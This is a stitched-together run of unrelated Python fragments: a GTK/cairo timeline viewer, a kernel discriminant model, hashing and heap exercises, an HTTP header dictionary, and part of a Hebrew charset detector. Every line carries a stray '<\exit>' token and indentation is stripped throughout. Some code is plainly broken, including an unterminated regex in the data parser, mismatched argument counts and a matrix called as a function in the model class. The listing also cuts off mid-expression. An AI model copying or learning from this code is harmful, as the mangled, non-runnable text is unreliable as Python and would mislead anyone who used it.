self.draw_line(ctx, right_x_end + self.padding / 2, 0,<\exit>
0, bot_y)<\exit>
return<\exit>
class ScaleRenderer:<\exit>
def __init__(self):<\exit>
self.__top = 0<\exit>
return<\exit>
def set_bounds(self, lo, hi):<\exit>
self.__lo = lo<\exit>
self.__hi = hi<\exit>
def get_position(self, x):<\exit>
real_x = (x - self.__lo ) * self.__width / (self.__hi - self.__lo)<\exit>
return real_x<\exit>
def set_top(self):<\exit>
self.__top = 1<\exit>
def set_bot(self):<\exit>
self.__top = 0<\exit>
def layout(self, width):<\exit>
surface = cairo.ImageSurface(cairo.FORMAT_ARGB32, 1, 1)<\exit>
ctx = cairo.Context(surface)<\exit>
data_delta = self.__hi - self.__lo<\exit>
closest = 1<\exit>
while (closest*10) < data_delta:<\exit>
closest *= 10<\exit>
if (data_delta / closest) == 0:<\exit>
delta = closest<\exit>
elif(data_delta / closest) == 1:<\exit>
delta = closest / 10<\exit>
else:<\exit>
delta = closest<\exit>
start = self.__lo - (self.__lo % delta) + delta<\exit>
end = self.__hi - (self.__hi % delta)<\exit>
self.__delta = delta<\exit>
self.__width = width<\exit>
max_text_height = ctx.text_extents("ABCDEFGHIJKLMNOPQRSTUVWXYZabcedefghijklmnopqrstuvwxyz0123456789")[3]<\exit>
self.max_text_height = max_text_height<\exit>
height = max_text_height + 10<\exit>
self.__height = height<\exit>
def get_height(self):<\exit>
return self.__height<\exit>
def draw(self, ctx):<\exit>
delta = self.__delta<\exit>
start = self.__lo - (self.__lo % delta) + delta<\exit>
end = self.__hi - (self.__hi % delta)<\exit>
if self.__top == 1:<\exit>
s = -1<\exit>
else:<\exit>
s = 1<\exit>
ctx.set_source_rgb(0, 0, 0)<\exit>
ctx.set_line_width(1.0)<\exit>
ticks = range(int(start), int(end + delta), int(delta))<\exit>
for x in ticks:<\exit>
real_x = (x - self.__lo ) * self.__width / (self.__hi - self.__lo)<\exit>
ctx.move_to(real_x, 0)<\exit>
ctx.line_to(real_x, 5*s)<\exit>
ctx.close_path()<\exit>
ctx.stroke()<\exit>
(t_y_bearing, t_width, t_height) = ctx.text_extents(str(x))[1:4]<\exit>
if self.__top:<\exit>
text_delta = t_height + t_y_bearing<\exit>
else:<\exit>
text_delta = -t_y_bearing<\exit>
ctx.move_to(real_x - t_width / 2, (5 + 5 + text_delta)*s)<\exit>
ctx.show_text(str(x))<\exit>
delta /= 10<\exit>
if delta > 0:<\exit>
start = self.__lo - (self.__lo % delta) + delta<\exit>
end = self.__hi - (self.__hi % delta)<\exit>
for x in range(int(start), int(end + delta), int(delta)):<\exit>
real_x = (x - self.__lo ) * self.__width / (self.__hi - self.__lo)<\exit>
ctx.move_to(real_x, 0)<\exit>
ctx.line_to(real_x, 3*s)<\exit>
ctx.close_path()<\exit>
ctx.stroke()<\exit>
class GraphicRenderer:<\exit>
def __init__(self, start, end):<\exit>
self.__start = float(start)<\exit>
self.__end = float(end)<\exit>
self.__mid_scale = ScaleRenderer()<\exit>
self.__mid_scale.set_top()<\exit>
self.__bot_scale = ScaleRenderer()<\exit>
self.__bot_scale.set_bounds(start, end)<\exit>
self.__bot_scale.set_bot()<\exit>
self.__width = 1<\exit>
self.__height = 1<\exit>
def get_width(self):<\exit>
return self.__width<\exit>
def get_height(self):<\exit>
return self.__height<\exit>
def get_data_rectangle(self):<\exit>
y_start = self.__top_legend.get_height()<\exit>
x_start = self.__data.get_data_x_start()<\exit>
return(x_start, y_start, self.__width - x_start, self.__data.get_height())<\exit>
def scale_data(self, x):<\exit>
x_start = self.__data.get_data_x_start()<\exit>
x_scaled = x / (self.__width - x_start) * (self.__r_end - self.__r_start)<\exit>
return x_scaled<\exit>
def get_selection_rectangle(self):<\exit>
y_start = self.__top_legend.get_height() + self.__data.get_height() + self.__mid_scale.get_height() + 20<\exit>
y_height = self.__bot_scale.get_height() + 20<\exit>
x_start = self.__bot_scale.get_position(self.__r_start)<\exit>
x_end = self.__bot_scale.get_position(self.__r_end)<\exit>
return(x_start, y_start, x_end - x_start, y_height)<\exit>
def scale_selection(self, x):<\exit>
x_scaled = x / self.__width * (self.__end - self.__start)<\exit>
return x_scaled<\exit>
def set_range(self, start, end):<\exit>
s = min(start, end)<\exit>
e = max(start, end)<\exit>
start = max(self.__start, s)<\exit>
end = min(self.__end, e)<\exit>
self.__r_start = start<\exit>
self.__r_end = end<\exit>
self.__data.set_render_range(start, end)<\exit>
self.__mid_scale.set_bounds(start, end)<\exit>
self.layout(self.__width, self.__height)<\exit>
def get_range(self):<\exit>
return(self.__r_start, self.__r_end)<\exit>
def set_data(self, data):<\exit>
self.__data = data<\exit>
def set_top_legend(self, top_legend):<\exit>
self.__top_legend = top_legend<\exit>
def layout(self, width, height):<\exit>
self.__width = width<\exit>
self.__height = height<\exit>
self.__top_legend.layout(width)<\exit>
top_legend_height = self.__top_legend.get_height()<\exit>
self.__data.layout(width)<\exit>
self.__mid_scale.layout(width - self.__data.get_data_x_start())<\exit>
self.__bot_scale.layout(width)<\exit>
return<\exit>
def __x_pixel(self, x, width):<\exit>
new_x = (x - self.__start) * width / (self.__end - self.__start)<\exit>
return new_x<\exit>
def draw(self, ctx):<\exit>
ctx.save()<\exit>
ctx.set_source_rgb(1, 1, 1)<\exit>
ctx.set_operator(cairo.OPERATOR_SOURCE)<\exit>
ctx.rectangle(0, 0, self.__width, self.__height)<\exit>
ctx.fill()<\exit>
ctx.save()<\exit>
self.__top_legend.draw(ctx)<\exit>
top_legend_height = self.__top_legend.get_height()<\exit>
ctx.restore()<\exit>
ctx.move_to(0, top_legend_height)<\exit>
ctx.line_to(self.__width, top_legend_height)<\exit>
ctx.close_path()<\exit>
ctx.set_line_width(2)<\exit>
ctx.set_source_rgb(0, 0, 0)<\exit>
ctx.stroke()<\exit>
ctx.save()<\exit>
ctx.translate(0,<\exit>
top_legend_height)<\exit>
self.__data.draw(ctx)<\exit>
ctx.restore()<\exit>
ctx.save()<\exit>
ctx.translate(self.__data.get_data_x_start(),<\exit>
top_legend_height + self.__data.get_height() + self.__mid_scale.get_height())<\exit>
self.__mid_scale.draw(ctx)<\exit>
ctx.restore()<\exit>
height_used = top_legend_height + self.__data.get_height() + self.__mid_scale.get_height()<\exit>
ctx.move_to(self.__data.get_data_x_start(), height_used)<\exit>
ctx.rel_line_to(0, -self.__mid_scale.get_height())<\exit>
ctx.close_path()<\exit>
ctx.set_source_rgb(0, 0, 0)<\exit>
ctx.set_line_width(2)<\exit>
ctx.stroke()<\exit>
ctx.move_to(0, height_used)<\exit>
ctx.line_to(self.__width, height_used)<\exit>
ctx.close_path()<\exit>
ctx.set_line_width(2)<\exit>
ctx.set_source_rgb(0, 0, 0)<\exit>
ctx.stroke()<\exit>
select_start = self.__bot_scale.get_position(self.__r_start)<\exit>
select_end = self.__bot_scale.get_position(self.__r_end)<\exit>
ctx.move_to(0, height_used);<\exit>
ctx.line_to(self.__data.get_data_x_start(), height_used)<\exit>
ctx.line_to(select_start, height_used + 20)<\exit>
ctx.line_to(0, height_used + 20)<\exit>
ctx.line_to(0, height_used)<\exit>
ctx.set_source_rgb(0, 0, 0)<\exit>
ctx.set_line_width(1)<\exit>
ctx.stroke_preserve()<\exit>
ctx.set_source_rgb(0.9, 0.9, 0.9)<\exit>
ctx.fill()<\exit>
ctx.move_to(self.__width, height_used)<\exit>
ctx.line_to(self.__width, height_used + 20)<\exit>
ctx.line_to(select_end, height_used + 20)<\exit>
ctx.line_to(self.__width, height_used)<\exit>
ctx.set_source_rgb(0, 0, 0)<\exit>
ctx.set_line_width(1)<\exit>
ctx.stroke_preserve()<\exit>
ctx.set_source_rgb(0.9, 0.9, 0.9)<\exit>
ctx.fill()<\exit>
height_used += 20<\exit>
unused_start = self.__bot_scale.get_position(self.__r_start)<\exit>
unused_end = self.__bot_scale.get_position(self.__r_end)<\exit>
unused_height = self.__bot_scale.get_height() + 20<\exit>
ctx.rectangle(0, height_used,<\exit>
unused_start,<\exit>
unused_height)<\exit>
ctx.rectangle(unused_end,<\exit>
height_used,<\exit>
self.__width - unused_end,<\exit>
unused_height)<\exit>
ctx.set_source_rgb(0.9, 0.9, 0.9)<\exit>
ctx.fill()<\exit>
ctx.move_to(unused_end, height_used)<\exit>
ctx.line_to(self.__width, height_used)<\exit>
ctx.line_to(self.__width, height_used + unused_height)<\exit>
ctx.line_to(0, height_used + unused_height)<\exit>
ctx.line_to(0, height_used)<\exit>
ctx.line_to(unused_start, height_used)<\exit>
ctx.close_path()<\exit>
ctx.set_line_width(2)<\exit>
ctx.set_source_rgb(0, 0, 0)<\exit>
ctx.stroke()<\exit>
ctx.move_to(unused_start, height_used)<\exit>
ctx.line_to(unused_end, height_used)<\exit>
ctx.close_path()<\exit>
ctx.set_line_width(1)<\exit>
ctx.set_source_rgb(0.9, 0.9, 0.9)<\exit>
ctx.stroke()<\exit>
ctx.save()<\exit>
ctx.move_to(max(unused_start, 2), height_used)<\exit>
ctx.rel_line_to(0, unused_height)<\exit>
ctx.move_to(min(unused_end, self.__width - 2), height_used)<\exit>
ctx.rel_line_to(0, unused_height)<\exit>
ctx.set_dash([5], 0)<\exit>
ctx.set_source_rgb(0, 0, 0)<\exit>
ctx.set_line_width(1)<\exit>
ctx.stroke()<\exit>
ctx.restore()<\exit>
ctx.save()<\exit>
ctx.translate(0, height_used)<\exit>
self.__bot_scale.draw(ctx)<\exit>
ctx.restore()<\exit>
class GtkGraphicRenderer(gtk.DrawingArea):<\exit>
def __init__(self, data):<\exit>
super(GtkGraphicRenderer, self).__init__()<\exit>
self.__data = data<\exit>
self.__moving_left = False<\exit>
self.__moving_right = False<\exit>
self.__moving_both = False<\exit>
self.__moving_top = False<\exit>
self.__force_full_redraw = True<\exit>
self.add_events(gtk.gdk.POINTER_MOTION_MASK)<\exit>
self.add_events(gtk.gdk.BUTTON_PRESS_MASK)<\exit>
self.add_events(gtk.gdk.BUTTON_RELEASE_MASK)<\exit>
self.connect("expose_event", self.expose)<\exit>
self.connect('size-allocate', self.size_allocate)<\exit>
self.connect('motion-notify-event', self.motion_notify)<\exit>
self.connect('button-press-event', self.button_press)<\exit>
self.connect('button-release-event', self.button_release)<\exit>
def set_smaller_zoom(self):<\exit>
(start, end) = self.__data.get_range()<\exit>
self.__data.set_range(start, start + (end - start)*2)<\exit>
self.__force_full_redraw = True<\exit>
self.queue_draw()<\exit>
def set_bigger_zoom(self):<\exit>
(start, end) = self.__data.get_range()<\exit>
self.__data.set_range(start, start + (end - start) / 2)<\exit>
self.__force_full_redraw = True<\exit>
self.queue_draw()<\exit>
def output_png(self, filename):<\exit>
surface = cairo.ImageSurface(cairo.FORMAT_ARGB32,<\exit>
self.__data.get_width(),<\exit>
self.__data.get_height())<\exit>
ctx = cairo.Context(self.__buffer_surface)<\exit>
self.__data.draw(ctx)<\exit>
surface.write_to_png(filename)<\exit>
def button_press(self, widget, event):<\exit>
(x, y, width, height) = self.__data.get_selection_rectangle()<\exit>
(d_x, d_y, d_width, d_height) = self.__data.get_data_rectangle()<\exit>
if event.y > y and event.y < y + height:<\exit>
if abs(event.x - x) < 5:<\exit>
self.__moving_left = True<\exit>
return True<\exit>
if abs(event.x - (x + width)) < 5:<\exit>
self.__moving_right = True<\exit>
return True<\exit>
if event.x > x and event.x < x + width:<\exit>
self.__moving_both = True<\exit>
self.__moving_both_start = event.x<\exit>
self.__moving_both_cur = event.x<\exit>
return True<\exit>
if event.y > d_y and event.y < (d_y + d_height):<\exit>
if event.x > d_x and event.x < (d_x + d_width):<\exit>
self.__moving_top = True<\exit>
self.__moving_top_start = event.x<\exit>
self.__moving_top_cur = event.x<\exit>
return True<\exit>
return False<\exit>
def button_release(self, widget, event):<\exit>
if self.__moving_left:<\exit>
self.__moving_left = False<\exit>
left = self.__data.scale_selection(self.__moving_left_cur)<\exit>
right = self.__data.get_range()[1]<\exit>
self.__data.set_range(left, right)<\exit>
self.__force_full_redraw = True<\exit>
self.queue_draw()<\exit>
return True<\exit>
if self.__moving_right:<\exit>
self.__moving_right = False<\exit>
right = self.__data.scale_selection(self.__moving_right_cur)<\exit>
left = self.__data.get_range()[0]<\exit>
self.__data.set_range(left, right)<\exit>
self.__force_full_redraw = True<\exit>
self.queue_draw()<\exit>
return True<\exit>
if self.__moving_both:<\exit>
self.__moving_both = False<\exit>
delta = self.__data.scale_selection(self.__moving_both_cur - self.__moving_both_start)<\exit>
(left, right) = self.__data.get_range()<\exit>
self.__data.set_range(left + delta, right + delta)<\exit>
self.__force_full_redraw = True<\exit>
self.queue_draw()<\exit>
return True<\exit>
if self.__moving_top:<\exit>
self.__moving_top = False<\exit>
return False<\exit>
def motion_notify(self, widget, event):<\exit>
(x, y, width, height) = self.__data.get_selection_rectangle()<\exit>
if self.__moving_left:<\exit>
if event.x <= 0:<\exit>
self.__moving_left_cur = 0<\exit>
elif event.x >= x + width:<\exit>
self.__moving_left_cur = x + width<\exit>
else:<\exit>
self.__moving_left_cur = event.x<\exit>
self.queue_draw_area(0, int(y), int(self.__width), int(height))<\exit>
return True<\exit>
if self.__moving_right:<\exit>
if event.x >= self.__width:<\exit>
self.__moving_right = self.__width<\exit>
elif event.x < x:<\exit>
self.__moving_right_cur = x<\exit>
else:<\exit>
self.__moving_right_cur = event.x<\exit>
self.queue_draw_area(0, int(y), int(self.__width), int(height))<\exit>
return True<\exit>
if self.__moving_both:<\exit>
cur_e = self.__width - (x + width - self.__moving_both_start)<\exit>
cur_s = (self.__moving_both_start - x)<\exit>
if event.x < cur_s:<\exit>
self.__moving_both_cur = cur_s<\exit>
elif event.x > cur_e:<\exit>
self.__moving_both_cur = cur_e<\exit>
else:<\exit>
self.__moving_both_cur = event.x<\exit>
self.queue_draw_area(0, int(y), int(self.__width), int(height))<\exit>
return True<\exit>
if self.__moving_top:<\exit>
self.__moving_top_cur = event.x<\exit>
delta = self.__data.scale_data(self.__moving_top_start - self.__moving_top_cur)<\exit>
(left, right) = self.__data.get_range()<\exit>
self.__data.set_range(left + delta, right + delta)<\exit>
self.__force_full_redraw = True<\exit>
self.__moving_top_start = event.x<\exit>
self.queue_draw()<\exit>
return True<\exit>
(d_x, d_y, d_width, d_height) = self.__data.get_data_rectangle()<\exit>
if event.y > y and event.y < y + height:<\exit>
if abs(event.x - x) < 5 or abs(event.x - (x + width)) < 5:<\exit>
widget.window.set_cursor(gtk.gdk.Cursor(gtk.gdk.SB_H_DOUBLE_ARROW))<\exit>
return True<\exit>
if event.x > x and event.x < x + width:<\exit>
widget.window.set_cursor(gtk.gdk.Cursor(gtk.gdk.FLEUR))<\exit>
return True<\exit>
if event.y > d_y and event.y < (d_y + d_height):<\exit>
if event.x > d_x and event.x < (d_x + d_width):<\exit>
widget.window.set_cursor(gtk.gdk.Cursor(gtk.gdk.FLEUR))<\exit>
return True<\exit>
widget.window.set_cursor(None)<\exit>
return False<\exit>
def size_allocate(self, widget, allocation):<\exit>
self.__width = allocation.width<\exit>
self.__height = allocation.height<\exit>
self.__data.layout(allocation.width, allocation.height)<\exit>
self.__force_full_redraw = True<\exit>
self.queue_draw()<\exit>
def expose(self, widget, event):<\exit>
if self.__force_full_redraw:<\exit>
self.__buffer_surface = cairo.ImageSurface(cairo.FORMAT_ARGB32,<\exit>
self.__data.get_width(),<\exit>
self.__data.get_height())<\exit>
ctx = cairo.Context(self.__buffer_surface)<\exit>
self.__data.draw(ctx)<\exit>
self.__force_full_redraw = False<\exit>
ctx = widget.window.cairo_create()<\exit>
ctx.rectangle(event.area.x, event.area.y,<\exit>
event.area.width, event.area.height)<\exit>
ctx.clip()<\exit>
ctx.set_source_surface(self.__buffer_surface)<\exit>
ctx.paint()<\exit>
(x, y, width, height) = self.__data.get_selection_rectangle()<\exit>
if self.__moving_left:<\exit>
ctx.move_to(max(self.__moving_left_cur, 2), y)<\exit>
ctx.rel_line_to(0, height)<\exit>
ctx.close_path()<\exit>
ctx.set_line_width(1)<\exit>
ctx.set_source_rgb(0, 0, 0)<\exit>
ctx.stroke()<\exit>
if self.__moving_right:<\exit>
ctx.move_to(min(self.__moving_right_cur, self.__width - 2), y)<\exit>
ctx.rel_line_to(0, height)<\exit>
ctx.close_path()<\exit>
ctx.set_line_width(1)<\exit>
ctx.set_source_rgb(0, 0, 0)<\exit>
ctx.stroke()<\exit>
if self.__moving_both:<\exit>
delta_x = self.__moving_both_cur - self.__moving_both_start<\exit>
left_x = x + delta_x<\exit>
ctx.move_to(x + delta_x, y)<\exit>
ctx.rel_line_to(0, height)<\exit>
ctx.close_path()<\exit>
ctx.move_to(x + width + delta_x, y)<\exit>
ctx.rel_line_to(0, height)<\exit>
ctx.close_path()<\exit>
ctx.set_source_rgb(0, 0, 0)<\exit>
ctx.set_line_width(1)<\exit>
ctx.stroke()<\exit>
return False<\exit>
class MainWindow:<\exit>
def __init__(self):<\exit>
return<\exit>
def run(self, graphic):<\exit>
window = gtk.Window()<\exit>
self.__window = window<\exit>
window.set_default_size(200, 200)<\exit>
vbox = gtk.VBox()<\exit>
window.add(vbox)<\exit>
render = GtkGraphicRenderer(graphic)<\exit>
self.__render = render<\exit>
vbox.pack_end(render, True, True, 0)<\exit>
hbox = gtk.HBox()<\exit>
vbox.pack_start(hbox, False, False, 0)<\exit>
smaller_zoom = gtk.Button("Zoom Out")<\exit>
smaller_zoom.connect("clicked", self.__set_smaller_cb)<\exit>
hbox.pack_start(smaller_zoom)<\exit>
bigger_zoom = gtk.Button("Zoom In")<\exit>
bigger_zoom.connect("clicked", self.__set_bigger_cb)<\exit>
hbox.pack_start(bigger_zoom)<\exit>
output_png = gtk.Button("Output Png")<\exit>
output_png.connect("clicked", self.__output_png_cb)<\exit>
hbox.pack_start(output_png)<\exit>
window.connect('destroy', gtk.main_quit)<\exit>
window.show_all()<\exit>
gtk.main()<\exit>
def __set_smaller_cb(self, widget):<\exit>
self.__render.set_smaller_zoom()<\exit>
def __set_bigger_cb(self, widget):<\exit>
self.__render.set_bigger_zoom()<\exit>
def __output_png_cb(self, widget):<\exit>
dialog = gtk.FileChooserDialog("Output Png", self.__window,<\exit>
gtk.FILE_CHOOSER_ACTION_SAVE, ("Save", 1))<\exit>
self.__dialog = dialog<\exit>
dialog.set_default_response(1)<\exit>
dialog.connect("response", self.__dialog_response_cb)<\exit>
dialog.show()<\exit>
return<\exit>
def __dialog_response_cb(self, widget, response):<\exit>
if response == 1:<\exit>
filename = self.__dialog.get_filename()<\exit>
self.__render.output_png(filename)<\exit>
widget.hide()<\exit>
return<\exit>
def read_data(filename):<\exit>
timelines = Timelines()<\exit>
colors = Colors()<\exit>
fh = open(filename)<\exit>
m1 = re.compile('range ([^ ]+) ([^ ]+) ([^ ]+) ([0-9]+) ([0-9]+)')<\exit>
m2 = re.compile('event-str ([^ ]+) ([^ ]+) ([^ ]+) ([0-9]+)')<\exit>
m3 = re.compile('event-int ([^ ]+) ([^ ]+) ([0-9]+) ([0-9]+)')<\exit>
m4 = re.compile('color ([^ ]+)<\exit>
for line in fh.readlines():<\exit>
m = m1.match(line)<\exit>
if m:<\exit>
line_name = m.group(1)<\exit>
timeline = timelines.get(m.group(1))<\exit>
rang = timeline.get_range(m.group(2))<\exit>
data_range = DataRange()<\exit>
data_range.value = m.group(3)<\exit>
data_range.start = int(m.group(4))<\exit>
data_range.end = int(m.group(5))<\exit>
rang.add_range(data_range)<\exit>
continue<\exit>
m = m2.match(line)<\exit>
if m:<\exit>
line_name = m.group(1)<\exit>
timeline = timelines.get(m.group(1))<\exit>
ev = timeline.get_event_str(m.group(2))<\exit>
event = EventString()<\exit>
event.value = m.group(3)<\exit>
event.at = int(m.group(4))<\exit>
ev.add_event(event)<\exit>
continue<\exit>
m = m3.match(line)<\exit>
if m:<\exit>
line_name = m.group(1)<\exit>
timeline = timelines.get(m.group(1))<\exit>
ev = timeline.get_event_int(m.group(2))<\exit>
event = EventInt()<\exit>
event.value = int(m.group(3))<\exit>
event.at = int(m.group(4))<\exit>
ev.add_event(event)<\exit>
continue<\exit>
m = m4.match(line)<\exit>
if m:<\exit>
r = int(m.group(2), 16)<\exit>
g = int(m.group(3), 16)<\exit>
b = int(m.group(4), 16)<\exit>
color = Color(r / 255, g / 255, b / 255)<\exit>
colors.add(m.group(1), color)<\exit>
continue<\exit>
timelines.sort()<\exit>
return (colors, timelines)<\exit>
def main():<\exit>
(colors, timelines) = read_data(sys.argv[1])<\exit>
(lower_bound, upper_bound) = timelines.get_bounds()<\exit>
graphic = GraphicRenderer(lower_bound, upper_bound)<\exit>
top_legend = TopLegendRenderer()<\exit>
range_values = timelines.get_all_range_values()<\exit>
range_colors = []<\exit>
for range_value in range_values:<\exit>
range_colors.append(colors.lookup(range_value))<\exit>
top_legend.set_legends(range_values,<\exit>
range_colors)<\exit>
graphic.set_top_legend(top_legend)<\exit>
data = TimelinesRenderer()<\exit>
data.set_timelines(timelines, colors)<\exit>
graphic.set_data(data)<\exit>
range_mid = (upper_bound - lower_bound) / 2<\exit>
range_width = (upper_bound - lower_bound) / 10<\exit>
range_lo = range_mid - range_width / 2<\exit>
range_hi = range_mid + range_width / 2<\exit>
graphic.set_range(range_lo, range_hi)<\exit>
main_window = MainWindow()<\exit>
main_window.run(graphic)<\exit>
main()<\exit>
import numpy as np<\exit>
from Kernel import Kernel<\exit>
import numpy.matlib as Nmat<\exit>
import numpy.linalg as LA<\exit>
class GsFace(object):<\exit>
def __init__(self, X_tar, X_src):<\exit>
n_src, n_ftr1 = X_src.shape<\exit>
n_tar, n_ftr2 = X_tar.shape<\exit>
assert n_ftr1 == n_ftr2, 'the dimension of the X_src and the X_tar is not equal'<\exit>
n_ftr = n_ftr1<\exit>
self.theta = np.zeros([n_ftr + 2, 1])<\exit>
self.X_tar = X_tar<\exit>
self.X_src = X_src<\exit>
def P_prior(self, X, K):<\exit>
n_data, n_ftr = X.shape<\exit>
return 1 / np.sqrt(((2 * np.pi) ** (n_ftr * n_data)) * (LA.det(K) ** n_ftr)) * np.exp(<\exit>
-0.5 * (np.trace(K * X * X.T)))<\exit>
def KFDA_J(self, K, N_p, N_n, q=0):<\exit>
if q==0:<\exit>
q = N_p + N_n<\exit>
a = Nmat.ones([N_p + N_n, 1])<\exit>
a[0:N_p] = 1 / N_p<\exit>
a[N_p:] = -1 / N_n<\exit>
A = Nmat.matrix([np.diag(1 / np.sqrt(N_p) * (Nmat.identity(N_p) - 1 / N_p * Nmat.ones([N_p, N_p]))), \<\exit>
np.diag(1 / np.sqrt(N_n) * (Nmat.identity(N_n) - 1 / N_n * Nmat.ones([N_n, N_n])))])<\exit>
Q = K<\exit>
tmp = 1e8 * Nmat.identity(N_p + N_n) - 1e8 * A * Q * LA.inv(1e8 * Nmat.identity(q) + Q.T * A * A(Q)) * Q.T * A<\exit>
J = 1/1e-8 * (a.T * K * a - a.T * K * A * tmp * A * K * a)<\exit>
return J<\exit>
def P_latent(self, J, delta):<\exit>
return np.exp(-J / (delta ** 2))<\exit>
def P_theta(self):<\exit>
p = 1<\exit>
for i in range(len(self.theta)):<\exit>
p = p * self.theta[i]<\exit>
return p<\exit>
def P_poster(self, X, K, J, delta):<\exit>
n_data, n_ftr = X.shape<\exit>
log_prior = n_ftr / 2 * np.log(LA.det(K)) + 0.5 * np.trace(K * X * X.T)<\exit>
tmp = 0<\exit>
for i in range(len(self.theta)):<\exit>
tmp = tmp + np.log(self.theta[i])<\exit>
log_theta = tmp<\exit>
log_latent = -J / (delta ** 2)<\exit>
return log_prior + log_theta + log_latent<\exit>
def Gs_model(self, delta, beta, N_ps, N_ns, N_pt, N_nt, q=0):<\exit>
X_ts = np.append(self.X_tar, self.X_src)<\exit>
K_t = Kernel(self.X_tar, self.theta)<\exit>
J_t = self.KFDA_J(K_t, N_pt, N_nt, q)<\exit>
log_pt = np.log(self.P_poster(self.X_tar, K_t, J_t, delta))<\exit>
pt = self.P_poster(self.X_tar, K_t, J_t, N_pt, N_nt, q)<\exit>
K_ts = Kernel(X_ts, self.theta)<\exit>
J_ts = self.KFDA_J(K_ts, N_ps + N_pt, N_ns + N_nt, q)<\exit>
log_pts = np.log(self.P_poster(X_ts, K_ts, J_ts, delta))<\exit>
pts = self.P_poster(X_ts, K_ts, J_ts, N_ps, N_ns, q)<\exit>
K_s = Kernel(self.X_src, self.theta)<\exit>
J_s = self.KFDA_J(K_s, N_ps, N_ns, q)<\exit>
log_ps = np.log(self.P_poster(self.X_src, K_s, J_s, delta))<\exit>
Lmodl = -log_pt + beta * pt * log_pt + beta * (pts * log_ps - pts * log_pts)<\exit>
return Lmodl<\exit>
class Solution:<\exit>
def hashCode(self, key, HASH_SIZE):<\exit>
w = 1<\exit>
ret = 0<\exit>
for i in xrange(len(key)-1, -1, -1):<\exit>
ret = (ret+ord(key[i])*w)%HASH_SIZE<\exit>
w = (w*33)%HASH_SIZE<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().hashCode("abcd", 100) == 78<\exit>
client_common_headers = {<\exit>
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",<\exit>
"Accept-Encoding": "gzip,deflate,sdch",<\exit>
"Accept-Language": "en-US,en;q=0.8,zh;q=0.6,zh-CN;q=0.4",<\exit>
"Cache-Control": "max-age=0",<\exit>
"Connection": "keep-alive",<\exit>
"Referer": "https://www.google.com.hk/",<\exit>
"User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36"<\exit>
}<\exit>
import heapq<\exit>
class Heap(object):<\exit>
def __init__(self, data=None, key=lambda x: None):<\exit>
self.heap = data or None<\exit>
heapq.heapify(self.heap)<\exit>
self.key = key<\exit>
def push(self, item):<\exit>
if self.key:<\exit>
item = (self.key(item), item)<\exit>
heapq.heappush(self.heap, item)<\exit>
def pop(self):<\exit>
item = heapq.heappop(self.heap)<\exit>
return item[1] if self.key else item<\exit>
class Solution:<\exit>
def heapify(self, A):<\exit>
n = len(A)<\exit>
for i in xrange(n/2, -1, -1):<\exit>
self.heappush(A, i)<\exit>
def heappush(self, A, i):<\exit>
n = len(A)<\exit>
if i >= n:<\exit>
return<\exit>
l = 2*i+1<\exit>
r = 2*i+2<\exit>
mini = i<\exit>
if l < n and A[l] < A[mini]:<\exit>
mini = l<\exit>
if r < n and A[r] < A[mini]:<\exit>
mini = r<\exit>
if i != mini:<\exit>
A[i], A[mini] = A[mini], A[i]<\exit>
swapped = mini<\exit>
self.heappush(A, swapped)<\exit>
def heapify_error(self, A, i=0):<\exit>
n = len(A)<\exit>
if i >= n:<\exit>
return<\exit>
l = 2*i+1<\exit>
r = 2*i+2<\exit>
mini = i<\exit>
if l < n and A[l] < A[mini]:<\exit>
mini = l<\exit>
if r < n and A[r] < A[mini]:<\exit>
mini = r<\exit>
A[i], A[mini] = A[mini], A[i]<\exit>
self.heapify_error(A, l)<\exit>
self.heapify_error(A, r)<\exit>
if __name__ == "__main__":<\exit>
A = [45, 39, 32, 11]<\exit>
Solution().heapify(A)<\exit>
assert A == [11, 39, 32, 45]<\exit>
from .charsetprober import CharSetProber<\exit>
from .constants import eNotMe, eDetecting<\exit>
from .compat import wrap_ord<\exit>
FINAL_KAF = 0xea<\exit>
NORMAL_KAF = 0xeb<\exit>
FINAL_MEM = 0xed<\exit>
NORMAL_MEM = 0xee<\exit>
FINAL_NUN = 0xef<\exit>
NORMAL_NUN = 0xf0<\exit>
FINAL_PE = 0xf3<\exit>
NORMAL_PE = 0xf4<\exit>
FINAL_TSADI = 0xf5<\exit>
NORMAL_TSADI = 0xf6<\exit>
MIN_FINAL_CHAR_DISTANCE = 5<\exit>
MIN_MODEL_DISTANCE = 0.01<\exit>
VISUAL_HEBREW_NAME = "ISO-8859-8"<\exit>
LOGICAL_HEBREW_NAME = "windows-1255"<\exit>
class HebrewProber(CharSetProber):<\exit>
def __init__(self):<\exit>
CharSetProber.__init__(self)<\exit>
self._mLogicalProber = None<\exit>
self._mVisualProber = None<\exit>
self.reset()<\exit>
def reset(self):<\exit>
self._mFinalCharLogicalScore = 0<\exit>
self._mFinalCharVisualScore = 0<\exit>
self._mPrev = ' '<\exit>
self._mBeforePrev = ' '<\exit>
def set_model_probers(self, logicalProber, visualProber):<\exit>
self._mLogicalProber = logicalProber<\exit>
self._mVisualProber = visualProber<\exit>
def is_final(self, c):<\exit>
return wrap_ord(c) in [FINAL_KAF, FINAL_MEM, FINAL_NUN, FINAL_PE,<\exit>
FINAL_TSADI]<\exit>
def is_non_final(self, c):<\exit>
return wrap_ord(c) in [NORMAL_KAF, NORMAL_MEM, NORMAL_NUN, NORMAL_PE]<\exit>
def feed(self, aBuf):<\exit>
if self.get_state() == eNotMe:<\exit>
return eNotMe<\exit>
aBuf = self.filter_high_bit_only(aBuf)<\exit>
for cur in aBuf:<\exit>
if cur == ' ':<\exit>
if self._mBeforePrev != ' ':<\exit>
if self.is_final(self._mPrev):<\exit>
self._mFinalCharLogicalScore += 1<\exit>
elif self.is_non_final(self._mPrev):<\exit>
self._mFinalCharVisualScore += 1<\exit>
else:<\exit>
if ((self._mBeforePrev == ' ') and<\exit>
(self.is_final(self._mPrev)) and (cur != ' ')):<\exit>
self._mFinalCharVisualScore += 1<\exit>
self._mBeforePrev = self._mPrev<\exit>
self._mPrev = cur<\exit>
return eDetecting<\exit>
def get_charset_name(self):<\exit>
finalsub = self._mFinalCharLogicalScore - self._mFinalCharVisualScore<\exit>
if finalsub >= MIN_FINAL_CHAR_DISTANCE:<\exit>
return LOGICAL_HEBREW_NAME<\exit>
if finalsub <= -MIN_FINAL_CHAR_DISTANCE:<\exit>
return VISUAL_HEBREW_NAME<\exit>
modelsub = (self._mLogicalProber.get_confidence()<\exit>
